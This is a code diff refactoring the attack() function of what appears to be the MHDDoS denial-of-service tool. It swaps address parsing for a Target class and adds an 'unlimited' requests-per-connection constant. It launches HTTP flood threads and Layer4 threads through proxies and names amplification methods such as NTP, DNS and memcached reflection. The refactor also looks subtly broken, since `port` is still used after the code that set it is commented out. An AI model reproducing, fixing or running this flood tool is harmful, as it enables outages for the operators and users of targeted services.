@@ -27,6 +27,7 @@ from MHDDoS.utils.healthcheck_utils import TargetHealthCheckUtils
 from MHDDoS.utils.logs import craft_outreach_log_message
 from MHDDoS.utils.misc import Counter
 from MHDDoS.utils.proxies import ProxyManager, load_proxies
+from MHDDoS.utils.targets import Target
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -45,19 +46,12 @@ def exit(*message):
     _exit(1)
 
 
-# def load(
-#         proxies_file_path: str,
-#         useragents_file_path: str,
-#         referrers_file_path: str
-# ):
-#     # TODO: load all this stuff
-#     pass
+UNLIMITED_RPC = 1000000000000  # number of requests per connection used to make the attack "unlimited" by time
 
 
 def attack(
     attack_method: str,  # TODO: add option to use multiple attack methods
-    target_address: str,  # URL or IP
-    target_port: int,
+    target: Target,
     proxy_type: ProxyType = ProxyType.SOCKS5,
     proxies_file_path: str = "proxies/socks5.txt",
     user_agents_file_path: str = "user_agents.txt",
@@ -72,14 +66,9 @@ def attack(
     # check attack method
     if attack_method not in Methods.ALL_METHODS:
         exit(f"Provided method ('{attack_method}') not found. Available methods: {', '.join(Methods.ALL_METHODS)}")
-    # check if address is IPv4 or URL
-    is_ip = validators.ipv4(target_address)
-    is_url = False
-    if not is_ip:
-        target_address = Tools.ensure_http_present(target_address)
-        is_url = validators.url(target_address)
-    if not is_ip and not is_url:
-        exit(f"Provided target address ('{target_address}') is neither a valid IPv4 nor a URL. Please provide a valid target address next time.")
+    # check target
+    if not target.is_valid():
+        exit(f"Provided target ('{target}') has neither valid IPv4 nor URL. Please provide a valid target next time.")
 
     # HANDLE BOMBARDIER
     if attack_method == "BOMB":
@@ -99,23 +88,28 @@ def attack(
     TOTAL_BYTES_SENT = Counter()
 
     if attack_method in Methods.LAYER7_METHODS:
+        pass
 
-        # HANDLE PARAMETERS
-        url = URL(target_address)
-        host = url.host
-        try:
-            host = gethostbyname(url.host)
-        except Exception as e:
-            exit('Cannot resolve hostname ', url.host, e)
-        ip = Tools.get_ip(target_address)
-        # print(f"IP: {ip}")
-        # print(f"Port: {url.port}")
-        threads = int(argv[4])
-        rpc = int(argv[6])
-        timer = int(argv[7])
+        # TODO: no need no more - this is handled by class Target
+        # # HANDLE PARAMETERS
+        # url = URL(target_address)
+        # host = url.host
+        # try:
+        #     host = gethostbyname(url.host)
+        # except Exception as e:
+        #     exit('Cannot resolve hostname ', url.host, e)
+        # ip = Tools.get_ip(target_address)
+        # # print(f"IP: {ip}")
+        # # print(f"Port: {url.port}")
 
-        if len(argv) == 9:
-            logger.setLevel("DEBUG")
+        # TODO: no need no more in worrying about threads count
+        # threads = int(argv[4])
+        # rpc = int(argv[6])
+        # timer = int(argv[7])
+
+        # TODO: no need no more - we are logging to a file all the time
+        # if len(argv) == 9:
+        #     logger.setLevel("DEBUG")
 
         # TODO: no need no more in worrying about threads count
         # if threads > 1000:
@@ -124,22 +118,23 @@ def attack(
         #     logger.warning("RPC (Requests Per Connection) number is higher than 100")
 
         # TODO: manage threads actively
-        for _ in range(threads):
-            Layer7(url, host, attack_method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()
+        # for _ in range(threads):
+        #     Layer7(url, host, attack_method, rpc, event, uagents, referers, proxies, BYTES_SENT, REQUESTS_SENT).start()
 
     if attack_method in Methods.LAYER4_METHODS:
-        # HANDLE PARAMETERS
-        url = URL(target_address)
-        port = url.port
-        host = url.host
-
-        try:
-            host = gethostbyname(host)
-        except Exception as e:
-            exit('Cannot resolve hostname ', url.host, e)
-
-        if port > 65535 or port < 1:
-            exit("Invalid Port [Min: 1 / Max: 65535] ")
+        # TODO: no need no more - this is handled by class Target
+        # # HANDLE PARAMETERS
+        # url = URL(target_address)
+        # port = url.port
+        # host = url.host
+        #
+        # try:
+        #     host = gethostbyname(host)
+        # except Exception as e:
+        #     exit('Cannot resolve hostname ', url.host, e)
+        #
+        # if port > 65535 or port < 1:
+        #     exit("Invalid Port [Min: 1 / Max: 65535] ")
 
         RAW_SOCKET_METHODS = {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"}
         if attack_method in RAW_SOCKET_METHODS \
@@ -200,11 +195,12 @@ def attack(
         stop_event = Event()
         stop_event.clear()
         thread_stop_events.append(stop_event)
+
         # TODO: select random attack method from the list (when there will be multiple)
         if attack_method in Methods.LAYER7_METHODS:
-            Layer7(url, host, attack_method, rpc, stop_event, user_agents, referrers, proxies, BYTES_SENT, REQUESTS_SENT).start()
+            Layer7(target.url, target.ip, attack_method, UNLIMITED_RPC, stop_event, user_agents, referrers, proxies, BYTES_SENT, REQUESTS_SENT).start()
         elif attack_method in Methods.LAYER4_METHODS:
-            Layer4((host, port), referrers, attack_method, stop_event, proxies, BYTES_SENT, REQUESTS_SENT).start()
+            Layer4((target.ip, port), referrers, attack_method, stop_event, proxies, BYTES_SENT, REQUESTS_SENT).start()
 
     def stop_attack_thread():
         if len(thread_stop_events) == 0:
